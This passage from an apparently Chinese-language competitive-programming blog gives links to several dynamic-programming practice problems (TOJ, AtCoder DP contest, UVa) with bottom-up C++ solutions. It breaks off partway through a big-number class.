operator">&lt;=</span><span class="token number">9</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            cout<span class="token operator">&lt;&lt;</span>i<span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="TOJ-470-公假無雙"><a href="#TOJ-470-公假無雙" class="headerlink" title="TOJ 470 - 公假無雙"></a>TOJ 470 - 公假無雙</h4><blockquote><p><a href="https://toj.tfcis.org/oj/pro/470/">https://toj.tfcis.org/oj/pro/470/</a></p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> e<span class="token punctuation">[</span><span class="token number">1000005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">1000005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>n<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>e<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>e<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        cout<span class="token operator">&lt;&lt;</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="AtCoder-dp-a-Frog-1"><a href="#AtCoder-dp-a-Frog-1" class="headerlink" title="AtCoder dp_a - Frog 1"></a>AtCoder dp_a - Frog 1</h4><blockquote><p><a href="https://atcoder.jp/contests/dp/tasks/dp_a">https://atcoder.jp/contests/dp/tasks/dp_a</a></p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> h<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>h<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">3</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>h<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>h<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="AtCoder-dp-b-Frog-2"><a href="#AtCoder-dp-b-Frog-2" class="headerlink" title="AtCoder dp_b - Frog 2"></a>AtCoder dp_b - Frog 2</h4><blockquote><p><a href="https://atcoder.jp/contests/dp/tasks/dp_b">https://atcoder.jp/contests/dp/tasks/dp_b</a></p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> h<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chose i</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>k<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>k<span class="token operator">+</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1000000001</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">-</span>k <span class="token punctuation">;</span> j<span class="token operator">&lt;</span>i <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">abs</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>h<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="AtCoder-dp-c-Vacation"><a href="#AtCoder-dp-c-Vacation" class="headerlink" title="AtCoder dp_c - Vacation"></a>AtCoder dp_c - Vacation</h4><blockquote><p><a href="https://atcoder.jp/contests/dp/tasks/dp_c">https://atcoder.jp/contests/dp/tasks/dp_c</a> </p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//a</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//b</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//c</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="TOJ-540-鐵人三項"><a href="#TOJ-540-鐵人三項" class="headerlink" title="TOJ 540 - 鐵人三項"></a>TOJ 540 - 鐵人三項</h4><blockquote><p><a href="https://toj.tfcis.org/oj/pro/540/">https://toj.tfcis.org/oj/pro/540/</a></p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> t<span class="token punctuation">[</span><span class="token number">200005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> dp<span class="token punctuation">[</span><span class="token number">200005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    ios<span class="token operator">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cin<span class="token operator">>></span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">>></span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">>></span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> t<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> t<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> t<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">4</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h3 id="基本：有點變化"><a href="#基本：有點變化" class="headerlink" title="基本：有點變化"></a>基本：有點變化</h3><h4 id="UVa-369"><a href="#UVa-369" class="headerlink" title="UVa 369"></a>UVa 369</h4><blockquote><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?369">http://domen111.github.io/UVa-Easy-Viewer/?369</a></p></blockquote><h4 id="UVa-10198"><a href="#UVa-10198" class="headerlink" title="UVa 10198"></a>UVa 10198</h4><blockquote><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10198">http://domen111.github.io/UVa-Easy-Viewer/?10198</a><br>參考<a href="https://blog.csdn.net/Ricardo_Y1n/article/details/38397933">大數模板</a></p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">define</span> MAXN 9999</span><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 1010</span><span class="token macro property">#<span class="token directive keyword">define</span> DLEN 4</span><span class="token keyword">class</span> <span class="token class-name">BigNum</span><span class="token punctuation">{</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token function">BigNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>len<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>      <span class="token function">BigNum</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">BigNum</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">BigNum</span><span class="token punctuation">(</span><span class="token keyword">const</span> BigNum <span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    BigNum <span class="token operator">&amp;</span><span class="token keyword">operator</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> BigNum <span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">friend</span> istream<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">>></span><span class="token punctuation">(</span>istream<span class="token operator">&amp;</span><span class="token punctuation">,</span>BigNum<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">friend</span> ostream<span class="token operator">&amp;</span> <span class="token 